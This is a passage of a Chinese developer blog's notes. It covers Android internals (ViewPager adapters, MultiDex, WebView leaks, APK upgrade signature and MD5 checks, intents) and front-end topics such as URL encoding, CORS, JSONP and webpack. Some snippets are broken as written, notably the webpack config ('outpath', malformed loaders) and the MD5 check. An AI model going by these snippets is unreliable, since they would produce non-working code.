offset; mRight += offset; mRenderNode.offsetLeftAndRight(offset); 在smoothScrollTo中这个方法被调用，传了一个true。其实类似的scrollCache的讨论还很多。原理就是调用所有child的setDrawingCacheEnabled方法（不过目前看来这个因为USE_CACHE一直是false所以没用）看ViewPager的时候又想到一件事，最早的时候以为这种跟adapter打交道的View不应该用setData，应该用addData，并天真的以为内部实现就是直接从外部的list中取数据。在ViewPager源码中，有一个mItems的ArrayList,这么看来实际上外部的数据也只是被拿来填充到内部的一个新的List中。 ItemInfo addNewItem(int position, int index) { ItemInfo ii = new ItemInfo(); ii.position = position; ii.object = mAdapter.instantiateItem(this, position); ii.widthFactor = mAdapter.getPageWidth(position); if (index &lt; 0 || index &gt;= mItems.size()) { mItems.add(ii); } else { mItems.add(index, ii); } return ii; } // notifyDataSetChange最终走到了这里，关键在于getItemPosition这个方法的实现 void dataSetChanged() { // This method only gets called if our observer is attached, so mAdapter is non-null. final int adapterCount = mAdapter.getCount(); mExpectedAdapterCount = adapterCount; boolean needPopulate = mItems.size() &lt; mOffscreenPageLimit * 2 + 1 &amp;&amp; mItems.size() &lt; adapterCount; // mOffscreenPageLimit默认是1 // 比如原来的数量只有2，或者添加了新的数据，都需要重走一遍layout int newCurrItem = mCurItem; boolean isUpdating = false; for (int i = 0; i &lt; mItems.size(); i++) { final ItemInfo ii = mItems.get(i); final int newPos = mAdapter.getItemPosition(ii.object); if (newPos == PagerAdapter.POSITION_UNCHANGED) { continue; //这也就是adapter中getItemPosition发挥作用的地方，ViewPager更新了数据，如果不去复写这个方法，下面的destoryItem就无法走到(比如说删除了一个数据就没法删掉这个fragment) } if (newPos == PagerAdapter.POSITION_NONE) { mItems.remove(i); i--; if (!isUpdating) { mAdapter.startUpdate(this); isUpdating = true; } mAdapter.destroyItem(this, ii.position, ii.object); needPopulate = true; if (mCurItem == ii.position) { // Keep the current item in the valid range newCurrItem = Math.max(0, Math.min(mCurItem, adapterCount - 1)); needPopulate = true; } continue; } if (ii.position != newPos) { if (ii.position == mCurItem) { // Our current item changed position. Follow it. newCurrItem = newPos; } ii.position = newPos; needPopulate = true; } } if (isUpdating) { mAdapter.finishUpdate(this); //这里无论是FragmentPagerAdapter还是FragmentStatePagerAdapter都只是调用了transaction.commitNowAllowingStateLoss } Collections.sort(mItems, COMPARATOR); if (needPopulate) { // Reset our known page widths; populate will recompute them. final int childCount = getChildCount(); for (int i = 0; i &lt; childCount; i++) { final View child = getChildAt(i); final LayoutParams lp = (LayoutParams) child.getLayoutParams(); if (!lp.isDecor) { lp.widthFactor = 0.f; } } setCurrentItemInternal(newCurrItem, false, true); requestLayout(); } } 最后是关于ViewPager的预加载问题 void populate(int newCurrentItem) { if (curItem == null &amp;&amp; N &gt; 0) { curItem = addNewItem(mCurItem, curIndex); //首先是加载当前的item } // Fill 3x the available width or up to the number of offscreen // pages requested to either side, whichever is larger. // If we have no current item we have no work to do. // 左右两侧都放至少offscreenLimit*screenwidth的宽度，所以左右至少都加载一个 //实际加载的方法是在addNewItem里面， // Fill 3x the available width or up to the number of offscreen // pages requested to either side, whichever is larger. // If we have no current item we have no work to do. if (curItem != null) { float extraWidthLeft = 0.f; if(....){ addNewItem() } // .... 先填充左边 float extraWidthRight = curItem.widthFactor; // ...然后是右边 if(....){ addNewItem() } calculatePageOffsets(curItem, curIndex, oldCurInfo); } } viewPager的layoutParams是不认margin的，所以加左右margin得这样 viewPager.pageMargin = gapviewPager.clipToPadding = falseviewPager.setPadding(gap,0,gap,0) 还有PagerAdapter的getItemPosition这个方法，返回值限于POSITION_UNCHANGED，POSITION_NONE或者object的newPosition(很多时候都忘记写)fragment-state-pager-adapterViewPager 与 PagerAdapter 刷新那点事aosp的issue中关于viewPager的讨论 // 那么newPos可不可以返回POSITION_UNCHANGED和POSITION_NONE以外的东西呢？return object’s new position index from [0, {@link #getCount()}), {@link #POSITION_UNCHANGED} if the object’s position has not changed,or {@link #POSITION_NONE} if the item is no longer present.从方法的注释来看当然是可以的。从代码来看，如果getItemPosition返回的int值不是POSITION_UNCHANGED和POSITION_NONE的话，会把返回的值当做新的值来使用，同时needPopulate为true（也就是会调用requestLayout方法）最简单的例子是返回myFragments.indexOf(object) 亲测，adapter继承FragmentPagerAdapter，比方说adapter中有一个List，如果想要替换第0个和第1个的位置（这种不属于结构性替换），这样就可以了val list = adapter1.myFragmentsCollections.swap(list,0,1)adapter1.notifyDataSetChanged() // 这里走完了并不会调用任何scrollToItem方法，所以还是需要有下面的setCurrentItempager1.setCurrentItem(0,false) //这里只是避免动画 在adapter中这两个方法要保持一致性 override fun getItemId(position: Int): Long { return (myFragments[position] as PagerFragment).hashCode().toLong() //这里只需要返回一个足够表明独一无二身份的东西就好了,hashCode足以} override fun getItemPosition(object: Any): Int {//如果是两个数据之间调换了的话return myFragments.indexOf(object)}所以POSITION_NONE只是确保adapter的destoryItem方法会走到所有旧的fragment上述做法适用于FragmentPagerAdapter以及FragmentStatePagerAdapter这里还不得不提到FragmentPagerAdapter和FragmentStatePagerAdapter的区别 // FragmentPagerAdapter的 public Object instantiateItem(ViewGroup container, int position) { final long itemId = getItemId(position); // 这个方法默认返回了position，但事实上可以如果后续更新了某一个position的fragment，还是会使用之前的fragment,而不是走到getItem的重新创建item。个人觉得可以返回一个position+lastUpdateTimeStamp这样的String。也就能完成FragmentPagerAdapter的刷新问题了 // Do we already have this fragment? String name = makeFragmentName(container.getId(), itemId); Fragment fragment = mFragmentManager.findFragmentByTag(name); if (fragment != null) { if (DEBUG) Log.v(TAG, &quot;Attaching item #&quot; + itemId + &quot;: f=&quot; + fragment); mCurTransaction.attach(fragment); } else { fragment = getItem(position); if (DEBUG) Log.v(TAG, &quot;Adding item #&quot; + itemId + &quot;: f=&quot; + fragment); mCurTransaction.add(container.getId(), fragment, makeFragmentName(container.getId(), itemId)); } } // FragmentStatePagerAdapter的 @Override public Object instantiateItem(ViewGroup container, int position) { // If we already have this item instantiated, there is nothing // to do. This can happen when we are restoring the entire pager // from its saved state, where the fragment manager has already // taken care of restoring the fragments we previously had instantiated. if (mFragments.size() &gt; position) { Fragment f = mFragments.get(position); if (f != null) { return f; } } if (mCurTransaction == null) { mCurTransaction = mFragmentManager.beginTransaction(); } Fragment fragment = getItem(position); if (DEBUG) Log.v(TAG, &quot;Adding item #&quot; + position + &quot;: f=&quot; + fragment); if (mSavedState.size() &gt; position) { Fragment.SavedState fss = mSavedState.get(position); if (fss != null) { fragment.setInitialSavedState(fss); } } while (mFragments.size() &lt;= position) { mFragments.add(null); } fragment.setMenuVisibility(false); fragment.setUserVisibleHint(false); mFragments.set(position, fragment); mCurTransaction.add(container.getId(), fragment); return fragment; } 在AbsListView中，setScrollingCacheEnabled这个方法也存在，同样是调用的child的drawingCacheEnabledRomain Guy的博客提到了ListView默认开启，但他忘记了GridView默认开启 29.关于65536问题Too many classes in –main-dex-list, main dex capacity exceeded | 主Dex引用太多怎么办？MultiDex对于minSdk&gt; =21 不会生效，如果最低版本是21上面所有的任务都不会执行，也不会有主Dex列表的计算。这是因为在应用安装期间所有的dex文件都会被ART转换为一个.oat文件。所以minSdk高的也不用开multiDex了。在使用ART虚拟机的设备上(部分4.4设备，5.0+以上都默认ART环境)，已经原生支持多Dex，因此就不需要手动支持了 Android 5.0 (API level 21) and higher uses a runtime called ART which natively supports loading multiple DEX files from APK files. ART performs pre-compilation at app install time which scans for classesN.dex files and compiles them into a single .oat file for execution by the Android device. Therefore, if your minSdkVersion is 21 or higher, you do not need the multidex support library. 看下MultiDex的源码，secondaryDex文件的路径是/date/date//code_cache/secondary-dexes/ 这是一个文件夹MultiDex的原理基本上在简书 private static final class V14 { private static void install(final ClassLoader loader, final List&lt;File&gt; additionalClassPathEntries, final File optimizedDirectory) throws IllegalArgumentException, IllegalAccessException, NoSuchFieldException, InvocationTargetException, NoSuchMethodException { //通过反射获取loader的pathList字段，loader是由Application.getClassLoader()获取的，实际获取到的是PathClassLoader对象的pathList字段 final Field pathListField = findField(loader, &quot;pathList&quot;); final Object dexPathList = pathListField.get(loader); //dexPathList是PathClassLoader的私有字段，里面保存的是Main Dex中的class //dexElements是一个数组，里面的每一个item就是一个Dex文件 //makeDexElements()返回的是其他Dex文件中获取到的Elements[]对象，内部通过反射makeDexElements()获取 //expandFieldArray是为了把makeDexElements()返回的Elements[]对象添加到dexPathList字段的成员变量dexElements中 expandFieldArray(dexPathList, &quot;dexElements&quot;, makeDexElements(dexPathList, new ArrayList&lt;File&gt;(additionalClassPathEntries), optimizedDirectory)); } private static Object[] makeDexElements(final Object dexPathList, final ArrayList&lt;File&gt; files, final File optimizedDirectory) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException { final Method makeDexElements = findMethod(dexPathList, &quot;makeDexElements&quot;, (Class&lt;?&gt;[])new Class[] { ArrayList.class, File.class }); return (Object[])makeDexElements.invoke(dexPathList, files, optimizedDirectory); } } 这里面注意makeDexElements方法，是通过反射调用了Dalvik的DexPathList class的这个方法makeDexElements。说白了，整个过程就是在/data/data/(packagename)/code_cache/这个目录下面复制粘贴文件(class.dex文件也是文件)，复制粘贴文件带来的影响就是classLoader(Android上是BaseDexClassLoader)在findClass的时候调用的是DexPathList的findClass方法: public Class findClass(String name) { for (Element element : dexElements) { DexFile dex = element.dexFile; if (dex != null) { Class clazz = dex.loadClassBinaryName(name, definingContext); if (clazz != null) { return clazz; } } } return null; } 当然，Tinker也是采用的极其相似的方法，完成了dex替换(谁在这个数组前面谁就先得到加载)凯子哥提到由于在App冷启动的时候由于反射外加io操作，可能会比较卡甚至ANR,把这部分操作弄到子线程也是行的，一种可能的方案是从Instrumentation下手。 30 . 从已安装的app中提取apk鸿洋的博客中提到过如何使用bsdiff比较旧的apk和新的apk的差异 context = context.getApplicationContext(); ApplicationInfo applicationInfo = context.getApplicationInfo(); String apkPath = applicationInfo.sourceDir; return apkPath; 在Android Studio 3.0后，直接在Device Explorer中查看data/app/com.example.appname，发现里面有个base.apk文件。几乎就是把原有的apk文件复制了一份。 31. 老版本的WebView是存在内存泄露的参考大致上就是主动调用了WebView.destory方法，原本在onDetachedFromWindow中系统的一些资源释放就没有走到，作者给出了这样的解决方案 ViewParent parent = mWebView.getParent(); if (parent != null) { ((ViewGroup) parent).removeView(mWebView);// 这里面会调用到 view.dispatchDetachedFromWindow(); } mWebView.destroy(); webView的sourceCode 32. App升级或者安装之前是要做一些检查的这篇文章详尽描述了需要做的一些方案可能被劫持的地方有三处： 升级api(就是返回下载链接的接口)，下载api(就是那个cdn), 安装过程(调用packageManager之前) 升级接口必须https，避免返回恶意地址 检查file的md5和服务器response中的md5是否一致 还要对下载的文件进行包名和签名验证，防止Apk被恶意植入木马 // 升级接口返回下载地址之后 UpgradeModel aResult = xxxx;//解析服务器返回的后数据 if (aResult != null &amp;&amp; aResult.getData() != null ) { String url = aResult.getData().getDownUrl(); if (url == null || !TextUtils.equals(url, &quot;the_domain_that_i_own&quot;)) { // 如果不是自己掌握的域名，不下载 } } // 判断下载下来的文件的md5和升级接口描述的md5是否一致 File file = DownUtils.getFile(url); // 监测是否要重新下载 if (file.exists() &amp;&amp; TextUtils.equals(aResult.getData().getHashCode(), EncryptUtils.Md5File(file))) { &amp;&amp; TextUtils.equals(aResult.getData().getKey(), DownLoadModel.getData()..getKey()) // 如果符合，就去安装 不符合重新下载 删除恶意文件 } // 下面这些代码来自上述文章 public static void installApK(Context context, final String path, final String name ) { if (!SafetyUtils.checkFile(path + name, context)) { return; } if (!SafetyUtils.checkPagakgeName(context, path + name)) { Toast.makeText(context, &quot;升级包被恶意软件篡改 请重新升级下载安装&quot;, Toast.LENGTH_SHORT ).show(); DLUtils.deleteFile(path + name); ((Activity)context).finish(); return; } switch (SafetyUtils.checkPagakgeSign(context, path + name)) { case SafetyUtils.SUCCESS: DLUtils.openFile(path + name, context); break; case SafetyUtils.SIGNATURES_INVALIDATE: Toast.makeText(context, &quot;升级包安全校验失败 请重新升级&quot;, Toast.LENGTH_SHORT ).show(); ((Activity)context).finish(); break; case SafetyUtils.VERIFY_SIGNATURES_FAIL: Toast.makeText(context, &quot;升级包为盗版应用 请重新升级&quot;, Toast.LENGTH_SHORT ).show(); ((Activity)context).finish(); break; default: break; } } /** * 安全校验 * Created by LIUYONGKUI on 2016-04-21. */ public class SafetyUtils { /** install sucess */ protected static final int SUCCESS = 0; /** SIGNATURES_INVALIDATE */ protected static final int SIGNATURES_INVALIDATE = 3; /** SIGNATURES_NOT_SAME */ protected static final int VERIFY_SIGNATURES_FAIL = 4; /** is needcheck */ private static final boolean NEED_VERIFY_CERT = true; /** * checkPagakgeSigns. */ public static int checkPagakgeSign(Context context, String srcPluginFile) { PackageInfo PackageInfo = context.getPackageManager().getPackageArchiveInfo(srcPluginFile, 0); //Signature[] pluginSignatures = PackageInfo.signatures; Signature[] pluginSignatures = PackageParser.collectCertificates(srcPluginFile, false); boolean isDebugable = (0 != (context.getApplicationInfo().flags &amp; ApplicationInfo.FLAG_DEBUGGABLE)); if (pluginSignatures == null) { PaLog.e(&quot;签名验证失败&quot;, srcPluginFile); new File(srcPluginFile).delete(); return SIGNATURES_INVALIDATE; } else if (NEED_VERIFY_CERT &amp;&amp; !isDebugable) { //可选步骤，验证APK证书是否和现在程序证书相同。 Signature[] mainSignatures = null; try { PackageInfo pkgInfo = context.getPackageManager().getPackageInfo( context.getPackageName(), PackageManager.GET_SIGNATURES); mainSignatures = pkgInfo.signatures; } catch (PackageManager.NameNotFoundException e) { e.printStackTrace(); } if (!PackageParser.isSignaturesSame(mainSignatures, pluginSignatures)) { PaLog.e(&quot;升级包证书和旧版本证书不一致&quot;, srcPluginFile); new File(srcPluginFile).delete(); return VERIFY_SIGNATURES_FAIL; } } return SUCCESS; } /** * checkPagakgeName * @param context * @param srcNewFile * @return */ public static boolean checkPagakgeName (Context context, String srcNewFile) { PackageInfo packageInfo = context.getPackageManager().getPackageArchiveInfo(srcNewFile, PackageManager.GET_ACTIVITIES); if (packageInfo != null) { return TextUtils.equals(context.getPackageName(), packageInfo.packageName); } return false; } /** * checkFile * * @param aPath * 文件路径 * @param context * context */ public static boolean checkFile(String aPath, Context context) { File aFile = new File(aPath); if (aFile == null || !aFile.exists()) { Toast.makeText(context, &quot;安装包已被恶意软件删除&quot;, Toast.LENGTH_SHORT).show(); return false; } if (context == null) { Toast.makeText(context, &quot;安装包异常&quot;, Toast.LENGTH_SHORT).show(); return false; } return true; } } 33. TextView原生支持一些比较好玩的属性Advanced Android TextView比方说 Bitmap bitmap = BitmapFactory. decodeResource(getResource(),R.drawable_cheetah_title); Shader shader = new BitmapShader( bitmap, Shader.TileMode.REPEAT, Shader.TileMode.REPEAT); textView.getPaint().setShader(shader); ) TextView渲染html文档的时候可以自定义一个tagHandler显示数学上的带有分子和分母的分数，可以使用标签TextView里面有一个Layout.Alignment的属性，然后创建一个AlignMentSpan，可以用来实现类似于聊天的文字左对齐，右对齐，只用一个TextView 34. ContentProvider的一些点可以自定义权限，在manifest里面写URI有固定格式： 分析URI：content://com.ljq.provider.personprovider/person/10/name，其中content://是Scheme，com.ljq.provider.personprovider表示主机名或者authorities，person/10/name表示路径，此URI要操作person表中id为10的name字段。 自定义权限 &lt;permission android:name=&quot;me.pengtao.READ&quot; android:protectionLevel=&quot;normal&quot;/&gt; &lt;provider android:authorities=&quot;me.pengtao.contentprovidertest&quot; android:name=&quot;.provider.TestProvider&quot; android:readPermission=&quot;me.pengtao.READ&quot; android:exported=&quot;true&quot;&gt; &lt;/provider&gt; &lt;!-- 在第三方app中就可以声明： --&gt; &lt;uses-permission android:name=&quot;me.pengtao.READ&quot;/&gt; 另外说一句，ContentProvider是在App启动的时候就创建的，比Application的onCreate还要早 35. android:multiprocess=”true”Activity可以在Manifest中声明这个属性，provider也可以声明这个属性。这个意思就是说，这个activity或者provider在A进程被拉起，那就创建一个A进程的Activity实例。在B进程被拉起，就创建一个B进程的Activity实例。在那个进程被打开就创建一个跑在哪个进程的实例 If the app runs in multiple processes, this attribute determines whether multiple instances of the content provder are created. If true, each of the app’s processes has its own content provider object. If false, the app’s processes share only one content provider object. The default value is false.Setting this flag to true may improve performance by reducing the overhead of interprocess communication, but it also increases the memory footprint of each process. 36. 两个App之间共享数据 两个应用的ShareUserId相同，则共享对方的data目录下的文件，包括SharePreference, file, lib等文件。例如，在ShareUserId相同的情况下，读取另一个应用的SharePreference文件。 //第一个应用程序为的menifest文件代码如下： &lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.mythou.serviceID&quot; android:sharedUserId=&quot;com.mythou.share&quot; &gt; //第二个应用程序的menifest文件代码如下： &lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.mythou.clientID&quot; android:sharedUserId=&quot;com.mythou.share&quot; &gt; 读取的时候这么读 try { Context ct=this.createPackageContext (&quot;com.mythou.serviceID&quot;, Context.CONTEXT_IGNORE_SECURITY); SharedPreferences sp = ct.getSharedPreferences(&quot;appInfo&quot;, MODE_PRIVATE); String str2 = sp.getString(&quot;appname&quot;, &quot;service&quot;); Log.d(&quot;test&quot;, &quot;share preference--&gt;&quot; + str2); } catch (NameNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } 37. ActivityAlias就跟Alias一样&lt;activity android:name=&quot;com.mytest.StartupActivity&quot; android:exported=&quot;true&quot;&gt; &lt;/activity&gt; &lt;!-- Solution for upgrading issue --&gt; &lt;activity-alias android:name=&quot;com.mytest.HomeActivity&quot; android:targetActivity=&quot;com.mytest.StartupActivity&quot; android:exported=&quot;true&quot; android:enabled=&quot;true&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; &lt;/intent-filter&gt; &lt;/activity-alias&gt; 38. 自定义一个scheme也很简单比如说App打电话就是: //电话号码 String phoneNum = phoneNumEdit.getText().toString().trim(); //打电话 Intent callIntent = new Intent(Intent.ACTION_CALL); callIntent.setData(Uri.parse(&quot;tel:&quot;+phoneNum)); startActivity(callIntent); Intent takePhotoIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE); startActivityForResult(takePhotoIntent, REQUEST_TAKE_PHOTO); // 系统相机进程的数据还能通过onActivityResult返回，跨进程了 @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) { //如果去拍照请求返回 if (requestCode == REQUEST_TAKE_PHOTO) { //如果结果返回成功 if (resultCode == RESULT_OK) { Bitmap bmp = (Bitmap) data.getExtras().get(&quot;data&quot;); takeResultImg.setImageBitmap(bmp); } } super.onActivityResult(requestCode, resultCode, data); } &lt;activity android:name=&quot;com.sarnasea.interprocess.ShareActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;com.sarnasea.interprocess.MYACTION&quot;/&gt; &lt;data android:scheme=&quot;message&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; // 在ShareActivity获得其他应用程序传递过来的数据 （完全可以多进程） Uri data = getIntent().getData(); if (data != null) { //获得Host,也就是message://后面的主体内容 String host = data.getHost(); Toast.makeText(this, host, Toast.LENGTH_SHORT).show(); } Bundle bundle = getIntent().getExtras(); if(bundle != null){ //获得其他应用程序调用该Activity时传递过来的Extras数据 String value = bundle.getString(&quot;value&quot;); Toast.makeText(this, value, Toast.LENGTH_SHORT).show(); } // 外部启动这个Activity的方法 Intent intent = new Intent(); intent.setAction(&quot;com.sarnasea.interprocess.MYACTION&quot;); intent.setData(Uri.parse(&quot;message://Hello World!&quot;)); intent.putExtra(&quot;value&quot;, &quot;yanglu&quot;); startActivity(intent); //这个Activty还可以从另一个进程返回数据 Intent data = new Intent(); // 设置要返回的数据 data.putExtra(&quot;result&quot;, &quot;关闭Activity时返回的数据&quot;); // 设置返回码和Intent对象 setResult(Activity.RESULT_OK, data); // 关闭Activity finish(); 39. Intent的底层实现是共享内存两个Activity之间Intent传递数据的时候，Intent中的数据已经经历了两轮序列化和反序列化，当然是不同的对象熟悉AIDL的同学都很清楚，AIDL跨进程通信支持的数据类型是： Java 的原生类型，如int,boolean,long,float…String 和CharSequenceList 和 Map ,List和Map 对象的元素必须是AIDL支持的数据类型AIDL 自动生成的接口 需要导入(import)实现android.os.Parcelable 接口的类. 需要导入(import)。这里并不包括Serializable类型。于是去看了源码，发现是Parcel自己对Serializable类型的对象做了兼容，可以直接写入其中。public class Intent implements Parcelable, Cloneable Intent传递数据底层分析 Parcelable是Android为我们提供的序列化的接口,Parcelable相对于Serializable的使用相对复杂一些,但Parcelable的效率相对Serializable也高很多,这一直是Google工程师引以为傲的,有时间的可以看一下Parcelable和Serializable的效率对比 Parcelable vs Serializable 号称快10倍的效率 Parcelable的底层使用了 Parcel 机制， Parcel机制会将序列化的数据写入到一个共享内存中，其他进程通过Parcel从共享内存中读出字节流，然后反序列化后使用。这就是Intent或Bundle能够在activity或者在binder中跨进程通信的原理。 40. BlockCanary的原理就是在每一个Message执行前计时，结束后停止计时，看下时间有没有超过阈值。BlockCanary值得一提的是，这里面考虑到了系统给当前进程分配的CPU时间段具体就是 cat /proc/pid/stat ## 如果系统分配的cpu时间不够，那么卡顿也是难免的 ============================================================================= 有些地方会对Apk进行二次打包，加固就是防着这个的。 9. Facebook出品的BUCK能够用于编译Android 项目，速度比较快。一个具有网络传输的FileExplorerMultiDex原理偏向native层面的内存占用分析Android进程框架：进程的启动创建、启动与调度流程Android进程框架：进程的启动创建、启动与调度流程","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"前端速查手册","date":"2017-11-25T23:26:29.000Z","path":"2017/11/25/2017-11-25-front-end-cook-book/","text":"每一个领域都有些不知道该放哪的零碎的点，这里开辟一个新的地方，作为前端杂乱知识的汇总。 SPA(Single Page Application)单页应用（没有SEO,首屏时间比较长，因为一进去要把所有的js之类的东西都加载完，使用过程中比较流畅） Common js是node js的库遵守的,export import是es2015的东西,AMD(Asynchronous Module Definition)在common js的基础上加了一个带回调的require(用于浏览器) 常用网站cssmatic,一个可以用拖拽的方式生成css代码的神奇的网站不仅仅是font,还有很好的icon [TBS]腾讯浏览服务(Tencent Browsing Service, TBS)。网上很多人喷的微信浏览器慢就是这个handlebars一个html里面有两个id一样的元素没问题awesome css UI Design,Video link here Index html Relatedhtml标签中可以添加data-XXX标签用于把数据和ui块绑定。 p tag 里面能够放一个小的Strong tag &lt;p&gt;You Know &lt;strong&gt;No&lt;/strong&gt; Mystery&lt;/p&gt; 亲测，这些tag不分大小的，不是说div就一定是最外面的parent &lt;p&gt; new css PlayGround &lt;div&gt;哈哈&lt;/div&gt; &lt;/p&gt; 什么在阻塞DOM？ css RelatedVanilla javaScript RelatedAjax(Asynchronous javaScript &amp; xml)，从命名上来看就是异步的 json(JavaScript Object notation),摆明着就是给js用的 In JavaScript these two are equivalent: object.Propertyobject[“Property”]; 对于POST请求，如果Request中明确设置了:&gt;xhr.setRequestHeader(“Content-type”,”application/x-www-form-urlencoded”); 后台会认为这是一个提交表单的请求，body就应该设置为’’What is the difference between form data and request payload? 网页表单提交数据中包含+号的时候，加号直接变成空格java这边URLDecoder去decode一个未编码的带加号的string的时候，“+”直接变成了空格。而encode的时候，空格被编码成了+号，+号变成了%2b。 常规的表单提交content-type有两种：application/x-www-form-urlencoded和multipart/form-data,如果表单提交时不设置任何类型，默认以第一种方式提交数据；第二种属于带附件的表单提交，当表单中有附件时，必须设置表单的enctype为multipart/form-data.例如 JQuery的 Ajax，Content-Type 默认值为application/x-www-form-urlencoded;charset=utf-8。 Content-Type:application/x-www-form-urlencoded; charset=UTF-8这句话其实就是告诉ajax，在post的时候去把data用utf-8编码一遍（把“+”变成了”%2b”）。所以，如果默认写一个程序去post一个未经编码的带加号的string的话，服务器这边接收到的string中,”+”就变成了空格（因为后台是会用UrlDecoder去decode的，从源码来看，碰到了“+”直接换成了空格) url中带”+”号的问题陈年老坑之 URL Encoding 在正常的编码解码流程中，编码的时候先把加号替换为 %2B，然后把空格替换为加号；解码的时候先把加号替换为空格，再把 %2B 替换为加号，天衣无缝。假如我在一个经过编码的 URI 中直接添加加号，然后直接被拿去解码，加号就会妥妥的被替换成空格了。 我就碰到过那种后台传下来的url中包含’+’，然后用URLDecoder去decode一遍（这时候加号已经被替换成空格了），再去用正则match的时候，发现根本匹配不上这个url.那么如何判断一个string是否被encode过？ 由此想到url中出现汉字的情况，因为网络传输只能是0101这种，那么就可以用utf-8将汉字的unicode形式传输出去，后台再去根据商定好的encode format去解码。（所以java的URLDecoder的decode方法接受两个参数，一个是裸的文本,http本来就是text based，这没办法，第二个是encoding）。只要两端商定了同一种编码格式，那就能正常的通信。 Ajax中文乱码 前端传参出现汉字的情况有两种，一种是汉字出现在URL中的一部分，另一种是汉字出现在GET请求的queryParameters里面。其实想想也对，http请求是一行一行写text的,第一行是path，后面才是queryParameters ajax发送请求Web编码总结如果不指定CharSet,似乎会看页面编码,就是这个 &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; 这里面还涉及到一个用get和post请求那个比较合适的问题，GET请求浏览器会帮忙encode，但是，有的浏览器(IE)是用系统自带编码格式（windows中文版本上是GB2312)去encode的，如果使用POST,开发者可以自定义数据编码格式（自己调用encodeURIComponent把所有的data都utf-8加密一遍） 跨域是一个比较大的知识点about:1 Failed to load http://api.douban.com/v2/movie/top250: Response to preflight request doesn&#39;t pass access control check: No &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource. Origin &#39;http://localhost:8080&#39; is therefore not allowed access. 查了好久，原因是CORS(Control of Shared Resources)，通过ajax发起另一个domain(port)资源的请求默认是不安全的。主要是在js里面代码请求另一个网站(只要不满足host和port完全相同就不是同一个网站)，默认是被禁止的。chrome里面查看network的话，发现这条request确实发出去了，request header里面多了一个 Origin:http://localhost:8080显然这不是axios设置的，在看到这条header后，如果’/movie/top250’这个资源文件没有设置’Access-Control-Allow-Origin: http://localhost:8080&#39;的话，浏览器就算拿到了服务器的回复也不会允许被开发者获取。这是CORS做出的策略，也是前端开发常提到的跨域问题。 解决方法：1.和服务器商量好CORS2.使用jsonp(跨域请求并不限制带src属性的tag，比如script img这些)3.使用iframe跨域 CORS还是比较重要的东西，详解，据说会发两次请求,且只支持GET请求。cors的概念 search “原生javaScript跨域”、’jsonp跨域请求豆瓣250’ jsonp跨域获取豆瓣250接口豆瓣能支持jsonp是因为豆瓣服务器响应了 http://api.douban.com/v2/movie/top250?callback=anything这个query,这个anything是我们自己网页里面script里面定义的方法，豆瓣会返回一个: anything({json})的数据回来，直接调用anything方法 json【JavaScript Object Notation】MDN上的corz 将网页设置为允许 XMLHttpRequest 跨域访问 &lt;meta http-equiv=&quot;Access-Control-Allow-Origin&quot; content=&quot;*&quot;&gt; &lt;meta http-equiv=&quot;Access-Control-Allow-Origin&quot; content=&quot;http://www.1688hot.com:80&quot;&gt; 跨域的方法有很多，iframe是一种，iframe是在一个网页中展示另一个url页面资源的方式 &lt;iframe id=&quot;video&quot; width=&quot;420&quot; height=&quot;315&quot; src=&quot;https://www.baidu.com&quot; frameborder=&quot;0&quot; allowfullscreen&gt;&lt;/iframe&gt; 然后在localhost起一个服务器预览，就能在页面中正常展示百度首页。 jsonp的解释 亲测，Flask里面给response添加Header: response.headers[‘Access-Control-Allow-Origin’] = ‘http://localhost:8080‘ 在8080端口的web页面发起请求就能成功 2.2 ajax跨域操作XMLHttpRequest cannot load http://localhost:5000/hello.No ‘Access-Control-Allow-Origin’ header is present on the requested resource.用Flask做后台，大概的代码这样&lt;!– @app.route(&quot;/posts&quot;, methods=[&#39;GET&#39;]) def create_post() resp = Response(json.dumps(post_lists), mimetype=&#39;application/json&#39;) resp.headers[&#39;Access-Control-Allow-Origin&#39;] = &#39;*&#39; return resp ``` --&gt; ## Webpack configuration &gt; 安装 yarn add webpack //官网不推荐global安装 // 初始化项目 npm init -y // 使用 webpack app.js bundle.js --watch // 将app.js编译成bundle.js， 实时监控文件变化。 Html文件中就可以引用bundle.js. build的话，就是把bundle.js minify的话 webpack app.js bundle.js -p ,其实就是帮忙把所有的空格删掉了 a.js ```js let resources = &#39;this is some external resources&#39;; // let 能用是因为node 支持es6这个特性 module.exports = resources; //如果不是用于浏览器的项目的话，node本身就支持require，只是浏览器不支持require app.js alert(require(&#39;./a.js&#39;)); 可以为webpack提供config文件webpack.config.js module.exports = { entry: &#39;./src/js/app.js&#39;, // 提供了一个entry,app.js又引用了其他的Js，最终追根溯源，会把所有的自定义和第三方框架全部打到一个bundle.js里面 outpath: { path: __dirname+&#39;/dist&#39;, filename: &#39;bundle.js&#39; }, module: { loaders: { { test: /\\.css$/, //这个test的意思就是说这是个正则，webpack你自己拿去试，正斜杠表示当前目录下，反斜杠表示转义字符，就是后面那个点就把它当成&quot;.&quot;好了 loader: &#39;style-loader!css-loader&#39;} // 前面那个正则意思是针对所有的css文件，后面是需要安装的loader名称。 这个loader的顺序是从右往左的！ } } } 有了config文件，只需要输入webpack，就能自动根据config文件编译。在package.json文件中，添加script: “build”: “webpack” ， npm run build ，会自动根据configuration文件编译生成可用于生产环境的编译后文件。 webpack-dev-server(提供一个development server，因为之前只是走的file system) 安装yarn add webpack-dev-serverpackage.json中添加script :start: webpack-dev-server –entry ./src/js/app.js –out-filename .dist/bundle.jsnpm run start babel-loader(前提是安装了babel)安装参考官方文档babel就是把es6语法的js文件编译成es5文件的，单独使用的语法大概这样。 webpack的loader成百上千，babel-loader只是其中的一种 npm run babel – index.js -o bundle.js -w 